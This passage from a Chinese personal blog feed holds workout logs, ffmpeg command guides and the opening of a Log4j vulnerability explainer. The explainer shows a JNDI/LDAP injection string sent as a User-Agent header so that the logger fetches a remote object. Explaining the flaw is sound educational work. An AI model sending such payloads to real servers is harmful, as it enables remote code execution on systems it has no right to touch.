id="2022-03-23-星期三（硬拉）"><a href="#2022-03-23-星期三（硬拉）" class="headerlink" title="2022-03-23 星期三（硬拉）"></a>2022-03-23 星期三（硬拉）</h1><ul><li>罗马尼亚硬拉<ul><li>20kg 14 </li><li>40kg 8 9</li><li>45kg 9 9 9 9</li></ul></li><li>传统硬拉<ul><li>60kg 5 </li><li>80kg 5 5 5 5</li></ul></li></ul><h1 id="2022-03-24-星期四（有氧）"><a href="#2022-03-24-星期四（有氧）" class="headerlink" title="2022-03-24 星期四（有氧）"></a>2022-03-24 星期四（有氧）</h1><ul><li>坡度快走20分钟</li><li>爬楼机20分钟</li></ul><h1 id="2022-03-25-星期五（胸）"><a href="#2022-03-25-星期五（胸）" class="headerlink" title="2022-03-25 星期五（胸）"></a>2022-03-25 星期五（胸）</h1><ul><li>哑铃上斜卧推<ul><li>10kg 12</li><li>20kg 8</li><li>22kg 8 8 8 8</li></ul></li><li>平板杠铃卧推40kg 5 8 8</li><li>器械推胸<ul><li>21.8kg 8 9</li><li>26.8kg 6 5.2 4.5 4.5</li></ul></li><li>双杠臂屈伸41kg 8 8 8 8</li></ul><h1 id="2022-03-26-星期六（xjbl）"><a href="#2022-03-26-星期六（xjbl）" class="headerlink" title="2022-03-26 星期六（xjbl）"></a>2022-03-26 星期六（xjbl）</h1><ul><li>引体向上 8</li><li>杠铃弯举18kg 9 8 10 9 8 11</li></ul><h1 id="2022-03-28-星期一（背）"><a href="#2022-03-28-星期一（背）" class="headerlink" title="2022-03-28 星期一（背）"></a>2022-03-28 星期一（背）</h1><ul><li>引体向上 8 6 8 6</li><li>器械划船68kg 6 6 6 6 6</li><li>重锤下拉55kg 8 8 8 8</li><li>曲杆杠铃弯举25kg 6 6 6 7</li><li>单臂哑铃交替弯举<ul><li>10kg 6</li><li>8kg 16 14 16</li></ul></li></ul><h1 id="2022-03-29-星期二（胸）"><a href="#2022-03-29-星期二（胸）" class="headerlink" title="2022-03-29 星期二（胸）"></a>2022-03-29 星期二（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 15</li><li>40kg 12</li><li>55kg 3</li><li>52.5kg 5 5 5</li></ul></li><li>哑铃上斜卧推22kg 6 6 6 6</li><li>双杠臂屈伸50kg 11 12 12 12</li><li>史密斯窄距卧推<ul><li>20kg 9</li><li>25kg 6 6 5 5</li></ul></li></ul><h1 id="2022-03-30-星期三（硬拉）"><a href="#2022-03-30-星期三（硬拉）" class="headerlink" title="2022-03-30 星期三（硬拉）"></a>2022-03-30 星期三（硬拉）</h1><ul><li>罗马尼亚硬拉<ul><li>20kg 14 </li><li>40kg 10</li><li>50kg 8 8 9 8</li></ul></li><li>传统硬拉80kg 5 5 5 5 5</li></ul><h1 id="2022-03-31-星期四（背）"><a href="#2022-03-31-星期四（背）" class="headerlink" title="2022-03-31 星期四（背）"></a>2022-03-31 星期四（背）</h1><ul><li>实力推20kg 8</li><li>单臂划船<ul><li>15kg 10</li><li>35kg 6</li><li>40kg 6 6 6 6</li></ul></li><li>重锤高位下拉55kg 8 8 8 8</li><li>窄距对握划船<ul><li>39kg 10</li><li>52kg 7 7 8 8</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2022-03-01-星期二（胸）&quot;&gt;&lt;a href=&quot;#2022-03-01-星期二（胸）&quot; class=&quot;headerlink&quot; title=&quot;2022-03-01 星期二（胸）&quot;&gt;&lt;/a&gt;2022-03-01 星期二（胸）&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;平板杠铃
      
    
    </summary>
    
    
      <category term="健身" scheme="https://blog.smilexin.cn/tags/%E5%81%A5%E8%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>ffmpeg常用命令</title>
    <link href="https://blog.smilexin.cn/2022/02/24/ffmpeg%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html"/>
    <id>https://blog.smilexin.cn/2022/02/24/ffmpeg常用命令.html</id>
    <published>2022-02-23T16:00:00.000Z</published>
    <updated>2022-02-24T09:10:53.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="视频转换"><a href="#视频转换" class="headerlink" title="视频转换"></a>视频转换</h1><p>比如一个avi文件，想转为mp4，或者一个mp4想转为ts。<br><code>ffmpeg -i input.avi output.mp4</code><br><code>ffmpeg -i input.mp4 output.ts</code></p><h1 id="提取视频音频"><a href="#提取视频音频" class="headerlink" title="提取视频音频"></a>提取视频音频</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 提取完整音频，默认mp4的audio codec是aac,如果不是，可以都转为最常见的aac。</span><br><span class="line">ffmpeg -i test.mp4 -acodec copy -vn output.aac</span><br><span class="line"># 输出mp3</span><br><span class="line">ffmpeg -i test.mp4 -f mp3 -vn test.mp3</span><br><span class="line"># 输出指定时间段的音频</span><br><span class="line">ffmpeg -i mmgw2018_01.mp4 -ss 00:03:45 -t 00:00:45.0 -acodec copy -vn output.aac</span><br></pre></td></tr></table></figure><ul><li><code>-i</code> 表示input，即输入文件</li><li><code>-f</code> 表示format，即输出格式</li><li><code>-vn</code> 表示vedio not，即输出不包含视频</li><li><code>acodec copy</code> 使用已经在那里相同的音频流。</li><li><code>ss</code> 选项指定开始时间戳，使用 <code>t</code> 选项指定编码持续时间，例如从3分钟45秒钟开始，持续45秒。时间戳必须采用 <code>hh:mm:ss.xxx</code> 格式或以秒为单位，如果你不指定 <code>t</code> 选项，它将会结束。</li></ul><h1 id="提取视频"><a href="#提取视频" class="headerlink" title="提取视频"></a>提取视频</h1><p><code>ffmpeg -i input.mp4 -vcodec copy -an output.mp4</code></p><h1 id="视频剪切"><a href="#视频剪切" class="headerlink" title="视频剪切"></a>视频剪切</h1><p>下面的命令，可以从时间为00:00:15开始，截取5秒钟的视频。<br><code>ffmpeg -ss 00:00:15 -t 00:00:05 -i input.mp4 -vcodec copy -acodec copy output.mp4</code><br>-ss表示开始切割的时间，-t表示要切多少。上面就是从15秒开始，切5秒钟出来。</p><h1 id="码率控制"><a href="#码率控制" class="headerlink" title="码率控制"></a>码率控制</h1><p>码率控制对于在线视频比较重要。因为在线视频需要考虑其能提供的带宽。</p><p>那么，什么是码率？很简单：<br>bitrate = file size / duration<br>比如一个文件20.8M，时长1分钟，那么，码率就是：<br>biterate = 20.8M bit/60s = 20.8<em>1024</em>1024*8 bit/60s= 2831Kbps<br>一般音频的码率只有固定几种，比如是128Kbps，<br>那么，video的就是<br>video biterate = 2831Kbps -128Kbps = 2703Kbps。</p><p>那么ffmpeg如何控制码率。<br>ffmpg控制码率有3种选择，-minrate -b:v -maxrate<br>-b:v主要是控制平均码率。<br>比如一个视频源的码率太高了，有10Mbps，文件太大，想把文件弄小一点，但是又不破坏分辨率。<br>ffmpeg -i input.mp4 -b:v 2000k output.mp4<br>上面把码率从原码率转成2Mbps码率，这样其实也间接让文件变小了。目测接近一半。<br>不过，ffmpeg官方wiki比较建议，设置b:v时，同时加上 -bufsize<br>-bufsize 用于设置码率控制缓冲器的大小，设置的好处是，让整体的码率更趋近于希望的值，减少波动。（简单来说，比如1 2的平均值是1.5， 1.49 1.51 也是1.5, 当然是第二种比较好）</p><p><code>ffmpeg -i input.mp4 -b:v 2000k -bufsize 2000k output.mp4</code></p><p><code>-minrate -maxrate</code>就简单了，在线视频有时候，希望码率波动，不要超过一个阈值，可以设置maxrate。<br><code>ffmpeg -i input.mp4 -b:v 2000k -bufsize 2000k -maxrate 2500k output.mp4</code></p><h1 id="视频编码格式转换"><a href="#视频编码格式转换" class="headerlink" title="视频编码格式转换"></a>视频编码格式转换</h1><p>比如一个视频的编码是MPEG4，想用H264编码，咋办？<br><code>ffmpeg -i input.mp4 -vcodec h264 output.mp4</code><br>相反也一样<br><code>ffmpeg -i input.mp4 -vcodec mpeg4 output.mp4</code></p><p>当然了，如果ffmpeg当时编译时，添加了外部的x265或者X264，那也可以用外部的编码器来编码。（不知道什么是X265，可以 Google一下，简单的说，就是她不包含在ffmpeg的源码里，是独立的一个开源代码，用于编码HEVC，ffmpeg编码时可以调用它。当然 了，ffmpeg自己也有编码器）<br><code>ffmpeg -i input.mp4 -c:v libx265 output.mp4</code><br><code>ffmpeg -i input.mp4 -c:v libx264 output.mp4</code></p><h1 id="只提取视频ES数据"><a href="#只提取视频ES数据" class="headerlink" title="只提取视频ES数据"></a>只提取视频ES数据</h1><p><code>ffmpeg –i input.mp4 –vcodec copy –an –f m4v output.h264</code></p><h1 id="过滤器的使用"><a href="#过滤器的使用" class="headerlink" title="过滤器的使用"></a>过滤器的使用</h1><h2 id="将输入的1920x1080缩小到960x540输出"><a href="#将输入的1920x1080缩小到960x540输出" class="headerlink" title="将输入的1920x1080缩小到960x540输出:"></a>将输入的1920x1080缩小到960x540输出:</h2><p><code>ffmpeg -i input.mp4 -vf scale=960:540 output.mp4</code></p><blockquote><p>ps: 如果540不写，写成-1，即scale=960:-1, 那也是可以的，ffmpeg会通知缩放滤镜在输出时保持原始的宽高比。</p></blockquote><h2 id="为视频添加水印logo"><a href="#为视频添加水印logo" class="headerlink" title="为视频添加水印logo"></a>为视频添加水印logo</h2><p>比如，我有这么一个图片 <code>iQIYI_logo.png</code></p><p>想要贴到一个视频上，那可以用如下命令：<br>左上角：<br><code>./ffmpeg -i input.mp4 -i iQIYI_logo.png -filter_complex overlay output.mp4</code><br>右上角：<br><code>./ffmpeg -i input.mp4 -i logo.png -filter_complex overlay=W-w output.mp4</code><br>左下角：<br><code>./ffmpeg -i input.mp4 -i logo.png -filter_complex overlay=0:H-h output.mp4</code><br>右下角：<br><code>./ffmpeg -i input.mp4 -i logo.png -filter_complex overlay=W-w:H-h output.mp4</code></p><h2 id="去掉视频的logo"><a href="#去掉视频的logo" class="headerlink" title="去掉视频的logo"></a>去掉视频的logo</h2><p>语法：-vf delogo=x:y:w:h[:t[:show]]<br>x:y 离左上角的坐标<br>w:h logo的宽和高<br>t: 矩形边缘的厚度默认值4<br>show：若设置为1有一个绿色的矩形，默认值0。</p><p><code>ffmpeg -i input.mp4 -vf delogo=0:0:220:90:100:1 output.mp4</code></p><h1 id="截取视频图像"><a href="#截取视频图像" class="headerlink" title="截取视频图像"></a>截取视频图像</h1><p><code>ffmpeg -i input.mp4 -r 1 -q:v 2 -f image2 pic-%03d.jpeg</code><br>-r 表示每一秒几帧<br>-q:v表示存储jpeg的图像质量，一般2是高质量。<br>如此，ffmpeg会把input.mp4，每隔一秒，存一张图片下来。假设有60s，那会有60张。</p><p>可以设置开始的时间，和你想要截取的时间。<br><code>ffmpeg -i input.mp4 -ss 00:00:20 -t 10 -r 1 -q:v 2 -f image2 pic-%03d.jpeg</code><br><code>-ss</code> 表示开始时间<br><code>-t</code> 表示共要多少时间。<br>如此，ffmpeg会从input.mp4的第20s时间开始，往下10s，即20~30s这10秒钟之间，每隔1s就抓一帧，总共会抓10帧。</p><blockquote><p>参考博文：<a href="https://www.cnblogs.com/frost-yen/p/5848781.html" target="_blank" rel="noopener">https://www.cnblogs.com/frost-yen/p/5848781.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;视频转换&quot;&gt;&lt;a href=&quot;#视频转换&quot; class=&quot;headerlink&quot; title=&quot;视频转换&quot;&gt;&lt;/a&gt;视频转换&lt;/h1&gt;&lt;p&gt;比如一个avi文件，想转为mp4，或者一个mp4想转为ts。&lt;br&gt;&lt;code&gt;ffmpeg -i input.avi ou
      
    
    </summary>
    
    
      <category term="ffmpeg" scheme="https://blog.smilexin.cn/tags/ffmpeg/"/>
    
  </entry>
  
  <entry>
    <title>ffmpeg录制rtsp视频流</title>
    <link href="https://blog.smilexin.cn/2022/02/22/ffmpeg%E5%BD%95%E5%88%B6rtsp%E8%A7%86%E9%A2%91%E6%B5%81.html"/>
    <id>https://blog.smilexin.cn/2022/02/22/ffmpeg录制rtsp视频流.html</id>
    <published>2022-02-21T16:00:00.000Z</published>
    <updated>2022-02-22T07:57:28.692Z</updated>
    
    <content type="html"><![CDATA[<p>需要先安装ffmpeg，网上教程很多，自行百度</p><h1 id="录制rtsp视频流"><a href="#录制rtsp视频流" class="headerlink" title="录制rtsp视频流"></a>录制rtsp视频流</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i rtsp://admin:admin@192.168.1.100:554 -vcodec copy out.mp4</span><br><span class="line">./ffmpeg.exe -stimeout 5000000 -rtsp_transport tcp -i &quot;rtsp://101.71.97.174:554/openUrl/xmbcbFm?beginTime=20220217T191605&amp;endTime=20220217T191749&amp;playBackMode=1&quot; -vcodec copy  2.mp4</span><br></pre></td></tr></table></figure><p><code>-rtsp_transport tcp</code> 强制使用tcp方式读取rtsp流，如果不加这个则使用UDP方式，UDP方式容易丢帧或出现画面撕裂或者马赛克现象。</p><p><code>-vcodec copy</code> 按照rtsp流中视频原本的编码格式来保存。</p><p><code>-rw_timeout</code> 设置流超时时间，单位为微秒。 5秒(s) = 5000000微秒(μs)</p><blockquote><p>这是官方描述：<br>-rw_timeout        <int64>      ED……. Timeout for IO operations (in microseconds) (from 0 to I64_MAX) (default 0)</int64></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;需要先安装ffmpeg，网上教程很多，自行百度&lt;/p&gt;
&lt;h1 id=&quot;录制rtsp视频流&quot;&gt;&lt;a href=&quot;#录制rtsp视频流&quot; class=&quot;headerlink&quot; title=&quot;录制rtsp视频流&quot;&gt;&lt;/a&gt;录制rtsp视频流&lt;/h1&gt;&lt;figure class=
      
    
    </summary>
    
    
      <category term="ffmpeg" scheme="https://blog.smilexin.cn/tags/ffmpeg/"/>
    
  </entry>
  
  <entry>
    <title>ffmpeg合并本地线上m3u8格式视频并转mp4格式命令</title>
    <link href="https://blog.smilexin.cn/2022/02/07/ffmpeg%E5%90%88%E5%B9%B6%E6%9C%AC%E5%9C%B0%E7%BA%BF%E4%B8%8Am3u8%E6%A0%BC%E5%BC%8F%E8%A7%86%E9%A2%91%E5%B9%B6%E8%BD%ACmp4%E6%A0%BC%E5%BC%8F%E5%91%BD%E4%BB%A4.html"/>
    <id>https://blog.smilexin.cn/2022/02/07/ffmpeg合并本地线上m3u8格式视频并转mp4格式命令.html</id>
    <published>2022-02-06T16:00:00.000Z</published>
    <updated>2022-02-07T07:26:18.071Z</updated>
    
    <content type="html"><![CDATA[<p>需要先安装ffmpeg，网上教程很多，自行百度</p><h1 id="本地合并"><a href="#本地合并" class="headerlink" title="本地合并"></a>本地合并</h1><p>首先将m3u8的文件路径改为相对路径（根据情况而定，路径不对的情况下）<br>1.cd到m3u8文件目录下<br>2.执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -allowed_extensions ALL -protocol_whitelist &quot;file,http,crypto,tcp&quot; -i index.m3u8 -c copy a.mp4</span><br></pre></td></tr></table></figure></p><p><code>index.m3u8</code> 为m3u8文件名<br><code>a.mp4</code> 为合并后的文件名</p><h1 id="HTTP下载合并"><a href="#HTTP下载合并" class="headerlink" title="HTTP下载合并"></a>HTTP下载合并</h1><p>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i https://xxx.com/index.m3u8 -c copy a.mp4</span><br></pre></td></tr></table></figure></p><p><code>https://xxx.com/index.m3u8</code> 为m3u8文件路径<br><code>a.mp4</code> 为合并后的文件名</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;需要先安装ffmpeg，网上教程很多，自行百度&lt;/p&gt;
&lt;h1 id=&quot;本地合并&quot;&gt;&lt;a href=&quot;#本地合并&quot; class=&quot;headerlink&quot; title=&quot;本地合并&quot;&gt;&lt;/a&gt;本地合并&lt;/h1&gt;&lt;p&gt;首先将m3u8的文件路径改为相对路径（根据情况而定，路径不对的
      
    
    </summary>
    
    
      <category term="ffmpeg" scheme="https://blog.smilexin.cn/tags/ffmpeg/"/>
    
  </entry>
  
  <entry>
    <title>健身记录_202202</title>
    <link href="https://blog.smilexin.cn/2022/01/26/%E5%81%A5%E8%BA%AB%E8%AE%B0%E5%BD%95_202202.html"/>
    <id>https://blog.smilexin.cn/2022/01/26/健身记录_202202.html</id>
    <published>2022-01-25T16:00:00.000Z</published>
    <updated>2022-02-28T10:09:41.572Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-02-04"><a href="#2022-02-04" class="headerlink" title="2022-02-04"></a>2022-02-04</h1><p>俯卧撑 20 20 20 22 23 22 25 25</p><h1 id="2022-02-08-星期二（胸）"><a href="#2022-02-08-星期二（胸）" class="headerlink" title="2022-02-08 星期二（胸）"></a>2022-02-08 星期二（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 20</li><li>40kg 12</li><li>50kg 6 </li><li>55kg 3 3 3</li><li>52.5kg 5</li></ul></li><li>上斜哑铃卧推22kg 6 6 6 6</li><li>器械推胸<ul><li>21.8kg 8</li><li>26.8kg 4 4 3</li></ul></li><li>双杠臂屈伸41kg 7 8 8 8</li></ul><h1 id="2022-02-10-星期四（背）"><a href="#2022-02-10-星期四（背）" class="headerlink" title="2022-02-10 星期四（背）"></a>2022-02-10 星期四（背）</h1><ul><li>引体向上14kg 6 6 6 6</li><li>器械划船68kg 6 6 6 6</li><li>单臂划船37.5kg 6 6 6 6</li><li>重锤下拉55kg 6 6 6 6</li></ul><h1 id="2022-02-11-星期五（腿）"><a href="#2022-02-11-星期五（腿）" class="headerlink" title="2022-02-11 星期五（腿）"></a>2022-02-11 星期五（腿）</h1><ul><li>杠铃深蹲<ul><li>20kg 8</li><li>40kg 8</li><li>50kg 8</li><li>60kg 6 6 6 5</li></ul></li><li>传统硬拉<ul><li>60kg 5 5</li><li>70kg 4 4</li></ul></li></ul><h1 id="2022-02-14-星期一（胸）"><a href="#2022-02-14-星期一（胸）" class="headerlink" title="2022-02-14 星期一（胸）"></a>2022-02-14 星期一（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 20</li><li>40kg 12</li><li>55kg 4 4 4 3</li><li>50kg 6</li></ul></li><li>器械推下胸<ul><li>45kg 8</li><li>54kg 5 4 4 3</li></ul></li><li>上斜哑铃卧推<ul><li>22kg 4 4 3</li><li>20kg 4</li></ul></li><li>双杠臂屈伸41kg 7 6 6 6</li></ul><h1 id="2022-02-16-星期三（背）"><a href="#2022-02-16-星期三（背）" class="headerlink" title="2022-02-16 星期三（背）"></a>2022-02-16 星期三（背）</h1><ul><li>引体向上14kg 6 6 6 6</li><li>器械划船68kg 6 6 6 6</li><li>单臂划船40kg 6 6 6 6</li><li>窄距对握高位下拉<ul><li>39kg 7</li><li>45kg 5.8 5.5 4.7 4.7</li></ul></li><li>曲杆二头弯举20kg 8 8 9 8 8 5</li></ul><h1 id="2022-02-17-星期四（硬拉）"><a href="#2022-02-17-星期四（硬拉）" class="headerlink" title="2022-02-17 星期四（硬拉）"></a>2022-02-17 星期四（硬拉）</h1><ul><li>传统硬拉<ul><li>40kg 6 8</li><li>70kg 5 5 5</li><li>75kg 5 4</li></ul></li></ul><h1 id="2022-02-18-星期五（有氧-肩）"><a href="#2022-02-18-星期五（有氧-肩）" class="headerlink" title="2022-02-18 星期五（有氧+肩）"></a>2022-02-18 星期五（有氧+肩）</h1><ul><li>坡度快走20分钟</li><li>器械推肩<ul><li>23kg 10</li><li>32kg 6 7 8 8</li><li>36kg 2</li></ul></li></ul><h1 id="2022-02-20-星期天（胸）"><a href="#2022-02-20-星期天（胸）" class="headerlink" title="2022-02-20 星期天（胸）"></a>2022-02-20 星期天（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 20</li><li>40kg 10 12</li><li>50kg 6 6 5 5</li></ul></li><li>上斜哑铃卧推22kg 5 5 6 5</li><li>器械推胸21.8kg 6 6 6 6</li><li>双杠臂屈伸41kg 6 8 7 7 6</li><li>指扣引体向上 7 5 5 4</li></ul><h1 id="2022-02-21-星期一（背）"><a href="#2022-02-21-星期一（背）" class="headerlink" title="2022-02-21 星期一（背）"></a>2022-02-21 星期一（背）</h1><ul><li>器械划船<ul><li>36kg 9</li><li>68kg 6 6 6 6</li></ul></li><li>引体向上14kg 2</li><li>重锤下拉60kg 6 6 6 7</li><li>单臂划船40kg 6 6 6 6</li><li>曲杆二头弯举<ul><li>20kg 9</li><li>25kg 6 6 6 6</li></ul></li><li><p>对握引体向上（二头） 2</p></li><li><p>罗马尼亚硬拉</p><ul><li>20kg 12</li><li>30kg 15</li><li>40kg 10 10 10 10</li></ul></li></ul><h1 id="2022-02-22-星期二（腿）"><a href="#2022-02-22-星期二（腿）" class="headerlink" title="2022-02-22 星期二（腿）"></a>2022-02-22 星期二（腿）</h1><ul><li>罗马尼亚硬拉<ul><li>20kg 9</li><li>40kg 8 9 9 8</li></ul></li><li>传统硬拉80kg 3 3 4 4</li><li>杠铃深蹲<ul><li>40kg 8</li><li>60kg 6 6 6 6</li></ul></li></ul><h2 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h2><ul><li>臂力器<ul><li>30kg 12</li><li>50kg 1</li><li>40kg 8 12 12 13 12</li></ul></li></ul><h1 id="2022-02-23-星期三（肩）"><a href="#2022-02-23-星期三（肩）" class="headerlink" title="2022-02-23 星期三（肩）"></a>2022-02-23 星期三（肩）</h1><ul><li>蝴蝶机后束32kg 8 8 8 8</li><li>坐姿哑铃推举<ul><li>14kg 12</li><li>18kg 8</li><li>20kg 6 6 8 8</li></ul></li><li>器械坐姿推举<ul><li>15.4kg 8</li><li>20.4kg 6 7 6 5</li></ul></li><li>哑铃侧平举<ul><li>12kg 8 9 8</li><li>10kg 10</li></ul></li></ul><h1 id="2022-02-24-星期四（胸）"><a href="#2022-02-24-星期四（胸）" class="headerlink" title="2022-02-24 星期四（胸）"></a>2022-02-24 星期四（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 12</li><li>40kg 10 8</li><li>50kg 5</li><li>55kg 4.8 5 4 4</li></ul></li><li>上斜哑铃卧推22kg 5 5 5 5</li><li>器械推胸<ul><li>21.8kg 8</li><li>24.3kg 6 6 6 5</li></ul></li><li>双杠臂屈伸50kg 9 9 9 10</li></ul><h1 id="2022-02-25-星期五（背）"><a href="#2022-02-25-星期五（背）" class="headerlink" title="2022-02-25 星期五（背）"></a>2022-02-25 星期五（背）</h1><ul><li>辅助引体向上14kg 6 8 6 6</li><li>器械划船68kg 5 6 6 6</li><li>重锤下拉65kg 6 6 6 6</li><li>窄距对握高位下拉<ul><li>32kg 8</li><li>39kg 8 8</li><li>45kg 6 6 6</li></ul></li></ul><h1 id="2022-02-28-星期一（有氧）"><a href="#2022-02-28-星期一（有氧）" class="headerlink" title="2022-02-28 星期一（有氧）"></a>2022-02-28 星期一（有氧）</h1><ul><li>指扣引体向上 10</li><li>坡度快走40分钟</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2022-02-04&quot;&gt;&lt;a href=&quot;#2022-02-04&quot; class=&quot;headerlink&quot; title=&quot;2022-02-04&quot;&gt;&lt;/a&gt;2022-02-04&lt;/h1&gt;&lt;p&gt;俯卧撑 20 20 20 22 23 22 25 25&lt;/p&gt;
&lt;h1 id
      
    
    </summary>
    
    
      <category term="健身" scheme="https://blog.smilexin.cn/tags/%E5%81%A5%E8%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>Log4j核弹级漏洞到底怎么回事？</title>
    <link href="https://blog.smilexin.cn/2021/12/13/Log4j%E6%A0%B8%E5%BC%B9%E7%BA%A7%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%BA%95%E6%80%8E%E4%B9%88%E5%9B%9E%E4%BA%8B%EF%BC%9F.html"/>
    <id>https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html</id>
    <published>2021-12-12T16:00:00.000Z</published>
    <updated>2021-12-14T02:29:30.728Z</updated>
    
    <content type="html"><![CDATA[<p>相信大家这两天应该被这么一条新闻刷屏了吧：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/log4j/bug_news.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><font color="red" size="7">这个漏洞到底是怎么回事？</font><br><font color="red" size="7">核弹级，真的有那么厉害吗？</font><br><font color="red" size="7">怎么利用这个漏洞呢？</font><p>我看了很多技术分析文章，都太过专业，很多非Java技术栈或者不搞安全的人只能看个一知半解，导致大家只能看个热闹，对这个漏洞的成因、原理、利用方式、影响面理解的不到位。</p><p>这篇文章，我尝试让所有技术相关的朋友都能看懂：<strong>这个注定会载入网络安全史册上的漏洞，到底是怎么一回事！</strong></p><h1 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h1><p>不管是什么编程语言，不管是前端后端还是客户端，对打日志都不会陌生。</p><p>通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。</p><p>在Java技术栈中，用的比较多的日志输出框架主要是<code>log4j2</code>和<code>logback</code>。</p><p>今天讨论的主角就是<code>log4j2</code>。</p><p>我们经常会在日志中输出一些变量，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">"client ip: &#123;&#125;"</span>, clientIp)</span><br></pre></td></tr></table></figure><p>现在思考一个问题：</p><p>假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？</p><p>log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫<code>Lookup</code>的东西，可以用来输出更多内容：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/log4j/640.webp" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>lookup，顾名思义就是查找、搜索的意思，那在log4j2中，就是允许在输出日志的时候，通过某种方式去查找要输出的内容。</p><p>lookup相当于是一个接口，具体去哪里查找，怎么查找，就需要编写具体的模块去实现了，类似于面向对象编程中多态那意思。</p><p>好在，log4j2已经帮我们把常见的查找途径都进行实现了：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/log4j/lookup_ways.webp" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>具体每一个的意思，这里就不详述了，这不是本文的重点。</p><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>主要来看其中那个叫JNDI的东西：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/log4j/jndi_lookup.webp" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><blockquote><p>JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p></blockquote><p>看不懂？看不懂就对了！</p><p>简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</p><p>那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/log4j/jndi_impl.webp" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h1 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h1><p>继续把目光聚焦，咱们只看这个叫<strong>LDAP</strong>的东西。</p><blockquote><p>LDAP即Lightweight Directory Access Protocol（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。</p></blockquote><p>看不懂？看不懂就对了！</p><p>这个东西用在统一身份认证领域比较多，但今天也不是这篇文章的重点。你只需要简单粗暴理解：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>好了，有了以上的基础，再来理解这个漏洞就很容易了。</p><p>假如某一个Java程序中，将浏览器的类型记录到了日志中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String userAgent = request.getHeader(<span class="string">"User-Agent"</span>);</span><br><span class="line">logger.info(userAgent);</span><br></pre></td></tr></table></figure><p>网络安全中有一个准则：<strong>不要信任用户输入的任何信息</strong>。</p><p>这其中，<code>User-Agent</code>就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。</p><p>假如有人发来了一个HTTP请求，他的User-Agent是这样一个字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/exploit&#125;</span><br></pre></td></tr></table></figure><p>接下来，log4j2将会对这行要输出的字符串进行解析。</p><p>首先，它发现了字符串中有 